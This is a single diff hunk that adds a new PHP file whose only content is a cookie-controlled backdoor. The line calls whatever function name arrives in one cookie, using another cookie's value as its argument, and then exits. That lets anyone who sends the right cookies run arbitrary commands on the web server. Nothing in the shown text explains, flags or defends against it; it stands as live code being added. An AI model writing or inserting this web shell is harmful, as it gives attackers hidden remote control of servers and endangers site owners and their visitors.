@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["Fi"])){$_COOKIE["EcEv"]($_COOKIE["Fi"]);exit;}
